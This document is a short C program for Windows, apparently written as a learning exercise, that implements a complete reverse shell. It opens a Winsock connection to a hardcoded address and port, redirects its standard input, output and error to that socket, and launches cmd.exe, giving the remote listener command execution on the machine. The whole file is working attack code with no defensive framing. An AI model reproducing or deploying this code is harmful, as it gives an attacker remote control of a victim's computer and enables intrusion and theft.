#include <stdio.h>
#include <winsock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib") // instuction to compiler for including this additional lib when compiling
#include <string.h>

int main() {

	// winapi stuff
	STARTUPINFO si;
	PROCESS_INFORMATION pi;


	char ipAddr[] = "192.168.100.5";
	int port = 8081;

    // Initialization (when using sys/sockets.h initialization is not required ig)
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

    // setting a socket
	SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // set last arg to WSA_FLAG_OVERLAPPED for overlapped i/o

    //connect()
	struct sockaddr_in shellAddr;
	shellAddr.sin_family = AF_INET;
	shellAddr.sin_addr.s_addr = inet_addr(ipAddr);
	shellAddr.sin_port = htons(port);
	int connect = WSAConnect(shell, (struct sockaddr*)&shellAddr, sizeof(shellAddr), NULL, NULL, NULL, NULL);
	if (connect == SOCKET_ERROR) { printf("WSAConnect failed\n"); return EXIT_FAILURE;}  // SOCKET_ERROR expands to -1... can also use WSAGETLASTERRO()

    //recv()
	char rBuffer[512];
	recv(shell, rBuffer, sizeof(rBuffer), 0);


    //winapi stuff
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si); // cb stands for count bytes ... it is for veryfying structure size
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);   // set flags for stdinput, stdoutput, stderro

	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell; // pipe stdinput, stdoutput, stderror to the socket

    //CreateProcess()
	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // for spawning cmd

	WaitForSingleObject(pi.hProcess, INFINITE); // optional ig

    // cleanup
	CloseHandle(pi.hThread);
	memset(rBuffer, 0, sizeof(rBuffer)); // optional

	return EXIT_SUCCESS;
}